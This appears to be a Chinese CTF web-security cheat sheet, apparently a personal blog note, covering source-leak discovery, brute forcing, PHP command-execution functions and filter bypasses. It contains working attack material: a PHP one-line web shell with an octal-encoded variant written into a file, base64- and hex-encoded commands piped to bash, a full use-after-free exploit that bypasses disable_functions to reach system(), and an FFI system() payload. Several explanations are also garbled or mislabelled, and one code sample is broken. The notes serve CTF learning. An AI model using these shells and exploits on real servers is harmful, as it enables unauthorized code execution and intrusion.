<h4 id="js前台拦截"><a href="#js前台拦截" class="headerlink" title="js前台拦截"></a>js前台拦截</h4><pre><code class="javascript">&lt;script type=&quot;text/javascript&quot;&gt;
    window.oncontextmenu = function()&#123;return false&#125;;
    window.onselectstart = function()&#123;return false&#125;;
    window.onkeydown = function()&#123;if (event.keyCode==123)&#123;event.keyCode=0;event.returnValue=false;&#125;&#125;;
&lt;/script&gt;
</code></pre>
<p>应对方法：</p>
<ul>
<li>禁用JavaScript</li>
<li>ctrl+u</li>
<li>view-source+url</li>
</ul>
<h3 id="版本控制泄露"><a href="#版本控制泄露" class="headerlink" title="版本控制泄露"></a>版本控制泄露</h3><ul>
<li><p>.git泄露:访问url&#x2F;.git&#x2F;</p>
</li>
<li><p>.svn泄露:访问url&#x2F;.svn&#x2F;</p>
</li>
</ul>
<h3 id="robots后台泄露"><a href="#robots后台泄露" class="headerlink" title="robots后台泄露"></a>robots后台泄露</h3><p>  访问url&#x2F;robots.txt</p>
<p>  标志：disallow</p>
<h3 id="phps源码泄露"><a href="#phps源码泄露" class="headerlink" title="phps源码泄露"></a>phps源码泄露</h3><p>  访问index.phps下载备份文件</p>
<p>  或index.php.bak下载备份文件</p>
<h3 id="源码压缩包泄露"><a href="#源码压缩包泄露" class="headerlink" title="源码压缩包泄露"></a>源码压缩包泄露</h3><p>  访问<a target="_blank" rel="noopener" href="http://www.zip下载源码/">www.zip下载源码</a></p>
<h3 id="vim临时文件泄露"><a href="#vim临时文件泄露" class="headerlink" title="vim临时文件泄露"></a>vim临时文件泄露</h3><blockquote>
<p>vim是linux自带且常用的文件编辑器<br>vim在编辑时会生成一个隐藏的临时文件<br>当vim非正常关闭时这个文件就会被保留下来</p>
</blockquote>
<p>  访问index.php(编辑的文件名).swp</p>
<h3 id="域名txt记录泄露"><a href="#域名txt记录泄露" class="headerlink" title="域名txt记录泄露"></a>域名txt记录泄露</h3><p>  <a target="_blank" rel="noopener" href="http://www.jsons.cn/nslookup/">在线域名解析</a></p>
<h3 id="敏感信息公布"><a href="#敏感信息公布" class="headerlink" title="敏感信息公布"></a>敏感信息公布</h3><p>  网页模板中加后缀<code>/admin/</code>可出现登录窗口</p>
<blockquote>
<p>有时候网站上的公开信息，就是管理员常用密码</p>
</blockquote>
<h3 id="内部技术文档泄露"><a href="#内部技术文档泄露" class="headerlink" title="内部技术文档泄露"></a>内部技术文档泄露</h3><p>页面中存在技术文档信息</p>
<hr>
<h3 id="前端js信息搜集"><a href="#前端js信息搜集" class="headerlink" title="前端js信息搜集"></a>前端js信息搜集</h3><p>  查看js代码</p>
<p>  <code>\x</code>是js中十六进制编码的数据</p>
<p>  使用控制台修改前端数据</p>
<hr>
<h3 id="web前端应用"><a href="#web前端应用" class="headerlink" title="web前端应用"></a>web前端应用</h3><p>  改前端代码字段即可</p>
<hr>
<h2 id="http请求"><a href="#http请求" class="headerlink" title="http请求"></a>http请求</h2><ul>
<li><p>本地请求(放在user-agent头后)</p>
<pre><code class="markdown">X-Forwarded-For:127.0.0.1
</code></pre>
</li>
<li><p>发送json请求</p>
<pre><code class="json">&#123;&quot;username&quot;:&quot;admin&quot;,
&quot;password&quot;:114514
&#125;
</code></pre>
</li>
<li><p>nikto工具</p>
<blockquote>
<p>开源的（GPL）网页服务器扫描器</p>
</blockquote>
<pre><code>nikto -host ip/url
扫描
</code></pre>
</li>
<li><p>PUT请求</p>
<p>put请求与post一样都会改变服务器的数据，但是put的侧重点在于对于数据的修改操作，但是post侧重于对于数据的增加</p>
<p>可以创建文件（POST请求也可以）</p>
</li>
</ul>
<hr>
<h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><h3 id="BurpSuite爆破"><a href="#BurpSuite爆破" class="headerlink" title="BurpSuite爆破"></a>BurpSuite爆破</h3><p>拦截请求并发送到攻击器中</p>
<ul>
<li>选择需要爆破的payload位置</li>
<li>选择payload字典，若有需要还要选择payload处理方式与编码<ul>
<li>Palyload Encoding编码 进行base64加密的时候在最后可能存在 &#x3D;&#x3D; 这样就会影响base64 加密的结果</li>
</ul>
</li>
</ul>
<hr>
<h3 id="域名爆破"><a href="#域名爆破" class="headerlink" title="域名爆破"></a>域名爆破</h3><p><a href="http://www.virustotal.com:免费的可疑文件分析的网站">www.virustotal.com:免费的可疑文件分析的网站</a></p>
<hr>
<h3 id="条件爆破"><a href="#条件爆破" class="headerlink" title="条件爆破"></a>条件爆破</h3><p>PHP，Python</p>
<p>根据题目条件编写脚本</p>
<h3 id="随机数种子爆破"><a href="#随机数种子爆破" class="headerlink" title="随机数种子爆破"></a>随机数种子爆破</h3><pre><code class="php">&lt;?php
mt_srand(种子);
echo intval(mt_rand());		//根据题目条件修改
?&gt;
</code></pre>
<h3 id="伪随机数爆破"><a href="#伪随机数爆破" class="headerlink" title="伪随机数爆破"></a>伪随机数爆破</h3><p>在kali上使用php_mt_seed-4.0(注意种子的php版本)</p>
<pre><code>time ./php_mt_seed 第一次随机数
</code></pre>
<hr>
<h2 id="RCE-命令执行"><a href="#RCE-命令执行" class="headerlink" title="RCE(命令执行)"></a>RCE(命令执行)</h2><h3 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h3><pre><code class="php">assert()    //判断一个表达式是否成立。返回true or false; 

preg_replace()   //函数是用来执行一个正则表达式的搜索和替换的  preg_replace(要搜索的字符串，用于替换的字符串，要搜索替换的字符串)
</code></pre>
<ul>
<li><p><strong>eval()</strong></p>
<blockquote>
<p>将输入的字符串参数当做PHP程序代码来执行</p>
</blockquote>
<ul>
<li><pre><code class="php">如果我们通过&lt;?=`ls`;去执行的话需要在前面添加?&gt;
</code></pre>
</li>
</ul>
</li>
<li><p>**call_user_func()   **</p>
<blockquote>
<p>函数是用来执行一个正则表达式的搜索和替换的    call_user_fucn(被调用的回调函数，函数参数0个或多个【数组或列表的形式】)</p>
</blockquote>
<pre><code class="php">public function test($test1,$test2) &#123;
    return $test1 . $test2;
&#125;
echo call_user_func(array($this, &#39;test&#39;), &#39;a&#39;, &#39;b&#39;);//输出结果为ab
</code></pre>
</li>
<li><p><strong>call_user_func_array()</strong></p>
<blockquote>
<p>把第一个参数作为回调函数进行调用，第二个参数传入数组，将数组中的值作为回调函数的参数</p>
</blockquote>
<pre><code class="php">function a($b, $c) &#123;  
             echo $b; 
             echo $c; 
          &#125; 
          call_user_func_array(&#39;a&#39;, array(&quot;111&quot;, &quot;222&quot;));  //输出 111 222
</code></pre>
</li>
<li><p><strong><a href="#create_function%E5%87%BD%E6%95%B0">create_function()</a></strong></p>
</li>
<li><p><strong>array_map()</strong></p>
<blockquote>
<p>array_map(引用的函数名称,数组1,可选的数组2)</p>
</blockquote>
<pre><code class="php">function myfunction($v1)&#123;
function oneArray($v)
&#123;
    if ($v == &#39;two&#39;) &#123;
          return &quot;this is two&quot;;
      &#125;
    return $v;
&#125;
$one_array = [&#39;one&#39;,&#39;two&#39;,&#39;three&#39;];
print_r(array_map(&#39;oneArray&#39;, $one_array));
</code></pre>
</li>
</ul>
<h3 id="Linux指令"><a href="#Linux指令" class="headerlink" title="Linux指令"></a><a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-command-manual.html">Linux指令</a></h3><ul>
<li><p>ls：查看目录</p>
<ul>
<li>-lst 查看目录下文件权限</li>
</ul>
</li>
<li><p>whoami：返回系统当前用户名</p>
</li>
<li><p>pwd：显示当前目录</p>
</li>
<li><p><strong>source命令(.)</strong></p>
<blockquote>
<p>重新执行刚修改的初始化文件，使之立即生效，而不必注销并重新登录。因为linux所有的操作都会变成文件的格式存在。</p>
</blockquote>
<pre><code class="linux">source filename		# filename必须是可执行的脚本文件
或者
. filename			# 注意“.”号后面还有一个空格
</code></pre>
</li>
</ul>
<h4 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h4><ul>
<li><p><strong>cat</strong></p>
<blockquote>
<p>连接文件并打印到标准输出设备上</p>
</blockquote>
<p>读取文件内容，结果不会直接返还，需要查看网页源代码</p>
</li>
<li><p>tac&#x2F;head&#x2F;tail&#x2F;more&#x2F;less&#x2F;nl……：等同于cat</p>
</li>
<li><p><strong>uniq</strong></p>
<blockquote>
<p>检查及删除**文本文件(txt)**中重复出现的行列，一般与 sort 命令结合使用</p>
</blockquote>
<p>同样可以输出文件内容</p>
</li>
<li><p><strong>tee</strong></p>
<blockquote>
<p>读取标准输入的数据，并将其内容输出成文件	</p>
</blockquote>
<p>​	<code>command | tee file.txt</code></p>
</li>
<li><p><strong>mv</strong></p>
<blockquote>
<p>为文件或目录改名、或将文件或目录移入其它位置</p>
</blockquote>
<table>
<thead>
<tr>
<th>命令格式</th>
<th>运行结果</th>
</tr>
</thead>
<tbody><tr>
<td><code>mv source_file(文件) dest_file(文件)</code></td>
<td>将源文件名 source_file 改为目标文件名 dest_file</td>
</tr>
<tr>
<td><code>mv source_file(文件) dest_directory(目录)</code></td>
<td>将文件 source_file 移动到目标目录 dest_directory 中</td>
</tr>
<tr>
<td><code>mv source_directory(目录) dest_directory(目录)</code></td>
<td>目录名 dest_directory 已存在，将 source_directory 移动到目录名 dest_directory 中；目录名 dest_directory 不存在则 source_directory 改名为目录名 dest_directory</td>
</tr>
<tr>
<td><code>mv source_directory(目录) dest_file(文件)</code></td>
<td>出错</td>
</tr>
</tbody></table>
</li>
</ul>
<h4 id="Glob通配符"><a href="#Glob通配符" class="headerlink" title="Glob通配符"></a><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/d9633bb74e9a">Glob通配符</a></h4><p><code>*</code>：匹配零个或者多个字符</p>
<p><code>?</code>：匹配一个字符</p>
<p><code>[]</code>：匹配指定集合中的任意单个字符，比如<code>[abc]</code>表示匹配单个字符a或者b或者c</p>
<p><code>&#123;a,b&#125;</code>：匹配a或者b，a与b也是通配符，可以由其他通配符组成</p>
<p><code>!</code>：表示非，比如<code>!1.txt</code>表示排除文件<code>1.txt</code></p>
<p><code>[0-9]</code>：匹配单个数字</p>
<p><code>[[:upper:]]</code>：匹配任意单个大写字母</p>
<p><code>[[:lower:]]</code>：匹配任意单个小写字母</p>
<p><code>[[:digit:]]</code>：匹配任意单个数字，等价于<code>[0-9]</code></p>
<p><code>[[:alpha:]]</code>：匹配任意单个字母，包括大写字母与小写字母</p>
<p><code>[[:alnum:]]</code>：匹配任意单个字母与数字</p>
<p><code>[[:space:]]</code>：匹配单个空白字符</p>
<p><code>[[:punctl:]]</code>：匹配单个标点符号</p>
<p><code>[^]</code>:匹配指定集合之外的其他任意单个字符，比如<code>[^abc]</code>表示匹配除了a、b、c以外的其他任意字符</p>
<h3 id="系统命令"><a href="#系统命令" class="headerlink" title="系统命令"></a>系统命令</h3><p>使用<code>system</code>前先查看<code>phpinfo</code>中的disabled_functions禁用的函数</p>
<ul>
<li><p><strong>system()</strong></p>
<blockquote>
<p>直接在终端打印返回结果，成功则返回命令输出的最后一行，失败则返回FALSE</p>
</blockquote>
</li>
<li><p><strong>passthru()</strong></p>
<blockquote>
<p>执行外部程序并且显示原始输出，只调用命令，不返回任何结果，但把命令的运行结果原样地直接输出到标准输出设备上</p>
</blockquote>
<pre><code class="php">&lt;?php
     passthru(&quot;ls&quot;);
?&gt;

执行结果：index.phptest.php
</code></pre>
</li>
<li><p><strong>exec()</strong></p>
<blockquote>
<p>执行一个外部程序,命令执行结果的最后一行内容</p>
</blockquote>
<pre><code class="php">&lt;?php
        echo exec(&quot;ls&quot;,$output);
        echo &quot;&lt;/br&gt;&quot;;
        print_r($file);
?&gt;

//$output：数组格式，用于存储输出的信息


执行结果：
test.php
Array( [0] =&gt; index.php [1] =&gt; test.php)
</code></pre>
</li>
<li><p><strong>pcntl_exec()</strong></p>
<blockquote>
<p>在当前进程空间执行指定程序</p>
</blockquote>
</li>
<li><p><strong>shell_exec()</strong></p>
<blockquote>
<p>命令执行的输出。如果执行过程中发生错误或者进程不产生输出，则返回NULL。</p>
</blockquote>
<pre><code class="php">$result = shell_exec($cmd);

$cmd：shell脚本
$result：shell脚本的执行结果
</code></pre>
</li>
<li><p><strong>popen()</strong></p>
<blockquote>
<p>不会直接返回执行结果，而是返回一个文件指针，但是命令已经执行&#96;</p>
</blockquote>
<pre><code class="php">&lt;?php popen( &#39;whoami &gt;&gt; c:/1.txt&#39;, &#39;r&#39; ); ?&gt;
 
&lt;?php  
    $test = &quot;ls /tmp/test&quot;;  
    $fp = popen($test,&quot;r&quot;);  //popen打一个进程通道  
  
    while (!feof($fp)) &#123;      //从通道里面取得东西  
        $out = fgets($fp, 4096);  
         echo  $out;         //打印出来  
    &#125;  
    pclose($fp);  
?&gt; 
</code></pre>
</li>
<li><p>**反引号``**：命令执行，内联执行，`ls`输出查询结果的内容</p>
<blockquote>
<p>与shell_exec功能相同，执行shell命令并返回输出的字符串</p>
</blockquote>
</li>
<li><p>**ob_start()**：</p>
<blockquote>
<p>打开缓冲区，开始输出缓冲, 这时PHP停止输出, 在这以后的输出都被转到一个内部的缓冲里</p>
</blockquote>
</li>
<li><p><strong>&gt;</strong></p>
<blockquote>
<p>重定向符</p>
</blockquote>
<pre><code class="php">echo “123” &gt; /home/123.txt
</code></pre>
</li>
<li><p><code>&gt;/dev/null 2&gt;&amp;1</code></p>
<p>写入的内容会永远消失，也就是不进行回显，需用<code>;</code>号或者<code>||</code>等等一些命令分隔符进行命令分隔</p>
<ul>
<li><pre><code>/dev/null
</code></pre>
<blockquote>
<p>将标准输出1重定向到&#x2F;dev&#x2F;null中。 &#x2F;dev&#x2F;null代表linux的空设备文件，所有往这个文件里面写入的内容都会丢失，俗称“黑洞”。那么执行了&gt;&#x2F;dev&#x2F;null之后，标准输出就会不再存在，没有任何地方能够找到输出的内容</p>
</blockquote>
</li>
<li><pre><code>2&gt;&amp;1
</code></pre>
<blockquote>
<p>2&gt; 表示stderr标准错误</p>
<p>&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1</p>
<p>1 表示stdout标准输出，系统默认值是1，所以”&gt;&#x2F;dev&#x2F;null”等同于 “1&gt;&#x2F;dev&#x2F;null”</p>
</blockquote>
</li>
</ul>
<p><img src="C:/Users/Asus/AppData/Roaming/Typora/typora-user-images/image-20230305110214437.png" alt="image-20230305110214437"></p>
</li>
<li><p>&amp;：按位与</p>
</li>
<li><p>&amp;&amp;：逻辑与</p>
</li>
<li><p>|：按位或，直接执行下一条语句</p>
</li>
<li><p>||：逻辑或</p>
</li>
<li><p>;：在 shell 中，是”连续指令”，执行下一条语句</p>
</li>
<li><p>scandir(‘&#x2F;‘)：列出指定路径中的文件和目录</p>
</li>
<li><p>file_get_contents(‘&#x2F;flag’)：读取文件</p>
</li>
<li><p>find：查找与指定参数条件匹配的文件及目录列表</p>
<ul>
<li>-name：按文件名称查找</li>
</ul>
</li>
</ul>
<h3 id="绕过被过滤的字符"><a href="#绕过被过滤的字符" class="headerlink" title="绕过被过滤的字符"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45927819/article/details/109671655?ops_request_misc=%7B%22request_id%22:%22167003773216782428635305%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167003773216782428635305&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-109671655-null-null.142%5Ev67%5Epc_rank_34_queryrelevant25,201%5Ev3%5Econtrol,213%5Ev2%5Et3_esquery_v2&utm_term=ctf%20%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8Dls%E8%A2%AB%E8%BF%87%E6%BB%A4&spm=1018.2226.3001.4187">绕过被过滤的字符</a></h3><p><strong>下划线</strong>：“+”或“[”或“ ”或“.”</p>
<p><strong>空格（\x09）</strong>：$IFS$9 、${IFS} 、%09(php环境下)、重定向符&lt;&gt;、&lt;、\x20</p>
<p><strong>分号</strong>：%0a</p>
<p><strong>&#x2F;</strong>:chr(47)</p>
<p><strong>*号</strong>:先获取目标文件名称，然后通过<code>?通配符</code>匹配单个字母，也就是fla?????匹配flag.php(使用<code>&lt;</code>时不能使用<code>?</code>匹配)</p>
<p>​		使用fla’’g.php</p>
<p><strong>带参数输入</strong></p>
<pre><code class="php">?c=eval($_GET[1]);&amp;1=system(&quot;tac%20flag.php&quot;);
</code></pre>
<p><strong>文件包含</strong></p>
<pre><code class="php">eval(include;$_GET[a]?&gt;)&amp;a=伪协议
</code></pre>
<p><strong>关键词</strong>：</p>
<ul>
<li><p><code>当ls被过滤时： a=l;b=s;$a$b 当cat flag被过滤时： a=c;b=at;c=f;d=lag;$a$b $&#123;c&#125;$&#123;d&#125; \#cat test文件内容 a=“ccaatt”;b=$&#123;a:0:1&#125;$&#123;a:2:1&#125;$&#123;a:4:1&#125;;$b test</code></p>
</li>
<li><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><h3 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h3><p><code>echo Y2F0IC9mbGFn|base64 -d|bash ==&gt;cat /flag echo Y2F0IC9mbGFn|base64 -d|sh==&gt;cat /flag echo Y2F0IGZsYWcucGhw|base64 -d|bash==&gt;cat flag.php echo Y2F0IGZsYWcucGhw|base64 -d|sh==&gt;cat flag.php</code></p>
<h3 id="hex"><a href="#hex" class="headerlink" title="hex"></a>hex</h3><p><code>echo &quot;0x636174202f666c6167&quot; | xxd -r -p|bash ==&gt;cat /flag</code></p>
<h3 id="oct-x2F-字节"><a href="#oct-x2F-字节" class="headerlink" title="oct&#x2F;字节"></a>oct&#x2F;字节</h3><p><code>$(printf &quot;\154\163&quot;) ==&gt;ls $(printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;) ==&gt;cat /flag &#123;printf,&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;&#125;|\$0 ==&gt;cat /flag</code></p>
<h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><p>内容为</p>
<pre><code class="php">&lt;?php @eval($_POST[&#39;c&#39;]);?&gt;
$&#123;printf,&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;&#125; &gt;&gt; 1.php
</code></pre>
</li>
<li><h3 id="单引号双引号绕过"><a href="#单引号双引号绕过" class="headerlink" title="单引号双引号绕过"></a>单引号双引号绕过</h3><p><code>c&#39;a&#39;t test</code></p>
<p><code>  c&quot;a&quot;t test</code></p>
</li>
<li><h3 id="反斜杠绕过"><a href="#反斜杠绕过" class="headerlink" title="反斜杠绕过"></a>反斜杠绕过</h3><p><code>ca\t flag</code></p>
</li>
</ul>
<hr>
<h3 id="突破禁用函数"><a href="#突破禁用函数" class="headerlink" title="突破禁用函数"></a>突破禁用函数</h3><blockquote>
<p>system() has been disabled for security reasons说明php.ini配置中默认禁用了执行系统外部命令函数,我们可以用php内置函数来读取文件</p>
</blockquote>
<h5 id="输出打印"><a href="#输出打印" class="headerlink" title="输出打印:"></a>输出打印:</h5><pre><code class="php">print_r();
var_dump();
var_export();
</code></pre>
<h5 id="查看目录："><a href="#查看目录：" class="headerlink" title="查看目录："></a>查看目录：</h5><pre><code class="php">scandir(&#39;.&#39;)	//查看当前目录
glob(&#39;*&#39;)
scandir(&#39;/&#39;)	//查看根目录
</code></pre>
<p><a id="glob://协议"><a target="_blank" rel="noopener" href="https://www.kancloud.cn/a173512/php_note/1709824">glob:&#x2F;&#x2F;伪协议</a></a></p>
<pre><code class="php">?&gt;&lt;?php
$it = new DirectoryIterator($_GET[&#39;file&#39;]);
foreach($it as $f) &#123;
 printf(&quot;%s&quot;, $f-&gt;getFilename());
    echo&#39;&lt;/br&gt;&#39;; 
&#125;
?&gt;
    
    ?&gt; //闭合前面语句
    查询根目录用 ?file=glob:///*

$a=new DirectoryIterator(&quot;glob:///*&quot;);
foreach($a as $f)&#123;
    echo($f-&gt;__toString().&#39; &#39;);
&#125;exit();
</code></pre>
<blockquote>
<p>查找匹配的文件路径模式</p>
</blockquote>
<h5 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件:"></a>读取文件:</h5><pre><code class="php">show_source();
highlight_file();
file_get_contents();
include();
require();

当前目录直接读取
根目录下前面加/
</code></pre>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/li_n_k/article/details/128070017">uaf脚本命令执行</a></p>
<blockquote>
<p>利用php的垃圾回收的漏洞实现绕过安全目录</p>
</blockquote>
<pre><code class="php">c=function ctfshow($cmd) &#123;
    global $abc, $helper, $backtrace;

    class Vuln &#123;
        public $a;
        public function __destruct() &#123;
            global $backtrace;
            unset($this-&gt;a);
            $backtrace = (new Exception)-&gt;getTrace();
            if(!isset($backtrace[1][&#39;args&#39;])) &#123;
                $backtrace = debug_backtrace();
            &#125;
        &#125;
    &#125;

    class Helper &#123;
        public $a, $b, $c, $d;
    &#125;

    function str2ptr(&amp;$str, $p = 0, $s = 8) &#123;
        $address = 0;
        for($j = $s-1; $j &gt;= 0; $j--) &#123;
            $address &lt;&lt;= 8;
            $address |= ord($str[$p+$j]);
        &#125;
        return $address;
    &#125;

    function ptr2str($ptr, $m = 8) &#123;
        $out = &quot;&quot;;
        for ($i=0; $i &lt; $m; $i++) &#123;
            $out .= sprintf(&quot;%c&quot;,($ptr &amp; 0xff));
            $ptr &gt;&gt;= 8;
        &#125;
        return $out;
    &#125;

    function write(&amp;$str, $p, $v, $n = 8) &#123;
        $i = 0;
        for($i = 0; $i &lt; $n; $i++) &#123;
            $str[$p + $i] = sprintf(&quot;%c&quot;,($v &amp; 0xff));
            $v &gt;&gt;= 8;
        &#125;
    &#125;

    function leak($addr, $p = 0, $s = 8) &#123;
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper-&gt;a);
        if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125;
        return $leak;
    &#125;

    function parse_elf($base) &#123;
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i &lt; $e_phnum; $i++) &#123;
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 &amp;&amp; $p_flags == 6) &#123;

                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123;
                $text_size = $p_memsz;
            &#125;
        &#125;

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    &#125;

    function get_basic_funcs($base, $elf) &#123;
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i &lt; $data_size / 8; $i++) &#123;
            $leak = leak($data_addr, $i * 8);
            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;
                $deref = leak($leak);
                
                if($deref != 0x746e6174736e6f63)
                    continue;
            &#125; else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;
                $deref = leak($leak);
                
                if($deref != 0x786568326e6962)
                    continue;
            &#125; else continue;

            return $data_addr + $i * 8;
        &#125;
    &#125;

    function get_binary_base($binary_leak) &#123;
        $base = 0;
        $start = $binary_leak &amp; 0xfffffffffffff000;
        for($i = 0; $i &lt; 0x1000; $i++) &#123;
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) &#123;
                return $addr;
            &#125;
        &#125;
    &#125;

    function get_system($basic_funcs) &#123;
        $addr = $basic_funcs;
        do &#123;
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) &#123;
                return leak($addr + 8);
            &#125;
            $addr += 0x20;
        &#125; while($f_entry != 0);
        return false;
    &#125;

    function trigger_uaf($arg) &#123;

        $arg = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);
        $vuln = new Vuln();
        $vuln-&gt;a = $arg;
    &#125;

    if(stristr(PHP_OS, &#39;WIN&#39;)) &#123;
        die(&#39;This PoC is for *nix systems only.&#39;);
    &#125;

    $n_alloc = 10;
    $contiguous = [];
    for($i = 0; $i &lt; $n_alloc; $i++)
        $contiguous[] = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);

    trigger_uaf(&#39;x&#39;);
    $abc = $backtrace[1][&#39;args&#39;][0];

    $helper = new Helper;
    $helper-&gt;b = function ($x) &#123; &#125;;

    if(strlen($abc) == 79 || strlen($abc) == 0) &#123;
        die(&quot;UAF failed&quot;);
    &#125;

    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) &#123;
        die(&quot;Couldn&#39;t determine binary base address&quot;);
    &#125;

    if(!($elf = parse_elf($base))) &#123;
        die(&quot;Couldn&#39;t parse ELF header&quot;);
    &#125;

    if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;
        die(&quot;Couldn&#39;t get basic_functions address&quot;);
    &#125;

    if(!($zif_system = get_system($basic_funcs))) &#123;
        die(&quot;Couldn&#39;t get zif_system address&quot;);
    &#125;


    $fake_obj_offset = 0xd0;
    for($i = 0; $i &lt; 0x110; $i += 8) &#123;
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    &#125;

    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4);
    write($abc, 0xd0 + 0x68, $zif_system);

    ($helper-&gt;b)($cmd);
    exit();
&#125;

ctfshow(&quot;cat /flag0.txt&quot;);ob_end_flush();
</code></pre>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44700621/article/details/125381763">使用PDO连接MySQL数据库</a></p>
<blockquote>
<p>先连接默认数据库<code>information_schema</code>达到命令执行的目录，只需要猜解出mysql的用户名和密码即可，以此获取数据库名</p>
</blockquote>
<pre><code class="php">$dsn = &quot;mysql:host=localhost;dbname=information_schema&quot;;
$db = new PDO($dsn, &#39;root&#39;, &#39;root&#39;);
$rs = $db-&gt;query(&quot;select group_concat(SCHEMA_NAME) from SCHEMATA&quot;);
foreach($rs as $row)&#123;
        echo($row[0]).&quot;|&quot;; 
&#125;exit();
</code></pre>
<blockquote>
<p>然后使用<code>load_file</code>函数读取信息</p>
</blockquote>
<pre><code class="php">try &#123;$dbh = new PDO(&#39;mysql:host=localhost;dbname=information_schema&#39;, &#39;root&#39;,&#39;root&#39;);
        foreach($dbh-&gt;query(&#39;select load_file(&quot;/flag36.txt&quot;)&#39;) as $row)
        &#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;
        catch (PDOException $e) &#123;echo $e-&gt;getMessage();exit(0);
    &#125;
exit(0);
//information_schema改成要读取的数据库名
</code></pre>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ffi.cdef.php">FFI特性</a></p>
<blockquote>
<p>PHP&gt;&#x3D;7.4</p>
</blockquote>
<pre><code class="PHP">public static FFI::cdef(string $code = &quot;&quot;, ?string $lib = null): FFI
    
其中$code为一个字符串，包含常规C语言中的一系列声明，$lib为要加载和链接的共享库文件名称，如果省略lib，则平台将会尝试在全局范围内查找代码中声明的符号，其他系统将无法解析这些符号。
</code></pre>
<ul>
<li>Payload</li>
</ul>
<pre><code class="php">$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);//创建一个system对象
$a=&#39;/readflag &gt; 1.txt&#39;;//没有回显的,需要访问1.txt
$ffi-&gt;system($a);//通过$ffi去调用system函数
</code></pre>
<h5 id="ob-代码应对"><a href="#ob-代码应对" class="headerlink" title="ob_代码应对"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/Kracxi/article/details/121723791">ob_代码应对</a></h5><pre><code class="php">ob_get_contents();//返回输出缓冲区的内容
ob_end_clean();//清空（擦除）缓冲区并关闭输出缓冲
</code></pre>
<ul>
<li><p>绕过方法：</p>
<p>执行完我们传入的代码然后直接结束程序不执行后面的代码</p>
<pre><code class="php">die();
exit(0);
</code></pre>
</li>
</ul>
<hr>
<h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h3><ol>
<li><code>phpinfo()</code>查看<code>disable_functions</code>禁用函数</li>
<li><code>ls</code>查看目录下文件</li>
<li>执行命令获取flag</li>
<li>如果是假flag，<code>ls /</code>查看是否存在其他flag文件夹</li>
</ol>
<p>​		</p>
<hr>
<h3 id="无字母rce"><a href="#无字母rce" class="headerlink" title="无字母rce"></a>无字母rce</h3><blockquote>
<p>原型：对以下代码的绕过</p>
</blockquote>
<pre><code class="php">&lt;?php
if(!preg_match(&#39;/[a-z0-9]/is&#39;,$_GET[&#39;shell&#39;])) &#123;
  eval($_GET[&#39;shell&#39;]);
&#125;
</code></pre>
<h4 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h4><pre><code class="php">  &lt;?php
  highlight_file(__FILE__);
  $code1=&quot;system&quot;;
  $code2=&quot;cat /f*&quot;;
  echo &quot;&lt;br&gt;&quot;;
